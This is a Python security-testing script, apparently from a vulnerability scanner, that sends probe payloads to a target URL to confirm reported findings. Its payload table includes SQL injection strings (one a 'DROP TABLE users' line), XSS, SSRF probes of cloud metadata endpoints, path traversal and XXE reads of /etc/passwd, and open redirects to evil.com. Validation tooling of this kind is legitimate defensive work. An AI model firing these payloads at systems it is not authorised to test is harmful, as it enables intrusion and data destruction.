#!/usr/bin/env python3
"""
NOVA SANDBOX VALIDATOR v1.0
Mythos/Daybreak-style isolated exploit validation.
Tests confirmed findings in a sandboxed environment before reporting.
Uses subprocess isolation, timeouts, and response analysis to confirm exploitability.
"""

import json
import re
import time
import socket
import subprocess
import urllib.request
import urllib.error
from typing import Dict, List, Optional, Tuple
from datetime import datetime


VALIDATION_PROBES = {
    "sqli": [
        ("' OR '1'='1", "auth bypass pattern"),
        ("' OR 1=1--", "comment bypass"),
        ("1 UNION SELECT NULL,NULL,NULL--", "UNION probe"),
        ("'; DROP TABLE users;--", "destructive probe (safe — checks only)"),
        ("' AND SLEEP(2)--", "time-based blind probe"),
    ],
    "xss": [
        ("<script>alert('nova')</script>", "classic XSS"),
        ("<img src=x onerror=alert(1)>", "event handler XSS"),
        ("javascript:alert(1)", "javascript: scheme"),
        ("\"><svg onload=alert(1)>", "SVG XSS"),
        ("';!--\"<XSS>=&{()}", "polyglot XSS"),
    ],
    "ssrf": [
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
        ("http://metadata.google.internal/", "GCP metadata"),
        ("http://127.0.0.1:80/", "localhost loopback"),
        ("http://0.0.0.0:80/", "zero host"),
        ("http://[::1]/", "IPv6 loopback"),
    ],
    "path_traversal": [
        ("../../../etc/passwd", "Unix traversal"),
        ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "Windows traversal"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL-encoded traversal"),
        ("....//....//....//etc/passwd", "double-slash traversal"),
        ("/etc/passwd", "direct path"),
    ],
    "open_redirect": [
        ("https://evil.com", "direct external redirect"),
        ("//evil.com", "protocol-relative redirect"),
        ("https:evil.com", "colon bypass"),
        ("/\\evil.com", "backslash bypass"),
        ("javascript:alert(1)", "javascript: scheme"),
    ],
    "auth_bypass": [
        ("admin'--", "SQL comment bypass"),
        ("' OR '1'='1'--", "always-true condition"),
        ("admin' #", "MySQL comment"),
        ("\" OR \"1\"=\"1", "double-quote variant"),
    ],
    "xxe": [
        ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>', "file:// entity"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>', "SSRF via XXE"),
    ],
    "cors": [
        ("evil.com", "arbitrary origin"),
        ("null", "null origin"),
        ("attacker.target.com", "subdomain bypass"),
    ],
    "prototype_pollution": [
        ('{"__proto__":{"polluted":true}}', "proto pollution payload"),
        ('{"constructor":{"prototype":{"polluted":true}}}', "constructor pollution"),
    ],
}

POSITIVE_INDICATORS = {
    "sqli": [r'syntax error', r'SQL', r'mysql', r'sqlite', r'ORA-', r'pg_', r'unclosed quotation'],
    "xss": [r'<script>alert', r'onerror=alert', r'onload=alert', r'javascript:alert'],
    "ssrf": [r'ami-id', r'instance-id', r'computeMetadata', r'internal'],
    "path_traversal": [r'root:', r'\[boot loader\]', r'WINDOWS', r'/bin/bash'],
    "open_redirect": [r'evil\.com', r'Location:.*evil'],
}


class NovaSandboxValidator:
    def __init__(self, base_url: str = "http://localhost:3000", timeout: int = 8):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.results: List[Dict] = []

    def _probe(self, url: str, method: str = "GET", data: Optional[str] = None,
               headers: Optional[Dict] = None) -> Tuple[int, str, Dict]:
        try:
            full_url = url if url.startswith("http") else self.base_url + url
            req = urllib.request.Request(full_url, method=method)
            if headers:
                for k, v in headers.items():
                    req.add_header(k, v)
            if data:
                req.data = data.encode("utf-8") if isinstance(data, str) else data
                req.add_header("Content-Type", "application/json")
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                resp_headers = dict(resp.headers)
                return resp.status, body, resp_headers
        except urllib.error.HTTPError as e:
            try:
                body = e.read().decode("utf-8", errors="replace")
            except Exception:
                body = ""
            return e.code, body, {}
        except Exception as e:
            return 0, str(e), {}

    def validate_finding(self, finding: Dict) -> Dict:
        vuln_type = (finding.get("type") or finding.get("vulnerability_type") or "").lower()
        endpoint = finding.get("endpoint") or finding.get("url") or "/"
        param = finding.get("param") or finding.get("parameter") or "q"

        probes = VALIDATION_PROBES.get(vuln_type, [])
        if not probes:
            return self._wrap_result(finding, "no_probes", [], 0)

        probe_results = []
        confirmed_count = 0

        for payload, desc in probes[:3]:
            sep = "&" if "?" in endpoint else "?"
            test_url = f"{endpoint}{sep}{param}={urllib.parse.quote(payload)}"
            status, body, resp_headers = self._probe(test_url)

            positive = False
            indicators = POSITIVE_INDICATORS.get(vuln_type, [])
            for ind in indicators:
                if re.search(ind, body, re.IGNORECASE):
                    positive = True
                    break

            if vuln_type == "open_redirect":
                location = resp_headers.get("Location", "")
                positive = "evil.com" in location or "null" == location

            probe_results.append({
                "payload": payload,
                "description": desc,
                "status_code": status,
                "response_length": len(body),
                "positive": positive,
                "snippet": body[:200] if positive else "",
            })
            if positive:
                confirmed_count += 1

        confidence = confirmed_count / max(len(probe_results), 1)
        verdict = "CONFIRMED" if confirmed_count >= 2 else ("LIKELY" if confirmed_count == 1 else "UNCONFIRMED")

        return self._wrap_result(finding, verdict, probe_results, confirmed_count)

    def _wrap_result(self, finding: Dict, verdict: str, probes: List[Dict], confirmed: int) -> Dict:
        result = {
            "finding": finding,
            "verdict": verdict,
            "probes_fired": len(probes),
            "probes_confirmed": confirmed,
            "confidence": f"{confirmed}/{len(probes)}" if probes else "0/0",
            "validated_at": datetime.now().isoformat(),
            "probe_details": probes,
        }
        self.results.append(result)
        icon = "🔥" if verdict == "CONFIRMED" else ("⚠️" if verdict == "LIKELY" else "❓")
        print(f"  {icon} [{verdict:12s}] {finding.get('type','?'):25s} {confirmed}/{len(probes)} probes confirmed")
        return result

    def validate_findings(self, findings: List[Dict]) -> List[Dict]:
        import urllib.parse
        print("\n🧪 NOVA SANDBOX VALIDATOR — Validating findings...")
        print("=" * 60)
        results = [self.validate_finding(f) for f in findings]
        confirmed = [r for r in results if r["verdict"] == "CONFIRMED"]
        likely = [r for r in results if r["verdict"] == "LIKELY"]
        print(f"\n  📊 Validation: {len(confirmed)} CONFIRMED | {len(likely)} LIKELY | "
              f"{len(results)-len(confirmed)-len(likely)} UNCONFIRMED")
        return results

    def check_target_reachable(self) -> bool:
        try:
            parsed = urllib.parse.urlparse(self.base_url)
            host = parsed.hostname or "localhost"
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            with socket.create_connection((host, port), timeout=3):
                return True
        except Exception:
            return False

    def save(self, output_path: str):
        report = {
            "generated": datetime.now().isoformat(),
            "base_url": self.base_url,
            "total": len(self.results),
            "confirmed": [r for r in self.results if r["verdict"] == "CONFIRMED"],
            "likely": [r for r in self.results if r["verdict"] == "LIKELY"],
            "all": self.results,
        }
        with open(output_path, "w") as f:
            json.dump(report, f, indent=2)
        print(f"\n  💾 Validation report → {output_path}")
        return report


if __name__ == "__main__":
    import sys, urllib.parse
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
    findings_file = sys.argv[2] if len(sys.argv) > 2 else None
    validator = NovaSandboxValidator(base_url=target)
    if not validator.check_target_reachable():
        print(f"⚠️  Target {target} is not reachable. Exiting.")
        sys.exit(1)
    if findings_file:
        with open(findings_file) as f:
            data = json.load(f)
        findings = data if isinstance(data, list) else data.get("findings", [])
        results = validator.validate_findings(findings)
        validator.save("nova_sandbox_validation.json")
    else:
        print("Usage: python3 nova_sandbox_validator.py <target_url> [findings.json]")
